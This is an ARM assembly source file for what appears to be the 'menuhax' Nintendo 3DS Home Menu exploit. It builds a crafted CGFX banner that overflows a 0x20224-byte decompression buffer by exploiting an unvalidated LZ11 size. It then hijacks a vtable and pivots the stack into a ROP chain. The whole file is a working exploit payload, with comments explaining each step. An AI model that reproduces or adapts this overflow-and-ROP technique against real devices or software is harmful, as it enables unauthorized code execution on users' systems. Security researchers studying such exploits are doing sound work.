.arm
.section .init
.global _start

#include "menuhax_ropinclude.s"

_start: @ Start of "CGFX", magicnum isn't validated.
.word 0, 0, 0, 0, 0 @ Used for some sort of size calculation.

@ The banner loading is done by a seperate thread from main-thread, however the below heap data is used by the main-thread.

@ Home Menu itself calls the function for ROP_LOADR4_FROMOBJR0, which then uses vtable funcptr +12 below with r4=<see the end of this .s>. This is the initial vtable funcptr call.

vtable:
.word 0
.word 0
.word 0
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
//.word ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR @ vtable funcptr +16. Initial vtable funcptr call for the main-thread. This saves {r4-r8, lr} on the stack, then calls the funcptr from vtable+0x28 below.

/*@ vtable+0x28, called by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR. This then does the usual stack-pivot.
.space ((vtable + 0x28) - .)
.word ROP_LOADR4_FROMOBJR0*/

object:
.word ROPBUFLOC(vtable) @ object+0, vtable ptr.
.word 0
.word 0
.word 0
.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.

stackpivot_sploadword:
.word ROPBUFLOC(ropstackstart) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

/*@ objptr loaded by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR.
.space ((object + 0x34) - .)
.word ROPBUFLOC(object)*/

ropstackstart:

#include "menuhax_loader.s"

@ When decompressing CGFX from the BOSS CBMD, Home Menu doesn't validate the decompressed-size from the LZ11 header. The buffer size is 0x20224-bytes. Hence, the below triggers a buffer overflow. Only the last word here actually triggers a crash when invalid, or at least immediately.
.fill (((_start + 0x20224+0x24) - .) / 4), 4, ROPBUFLOC(object+0x20)

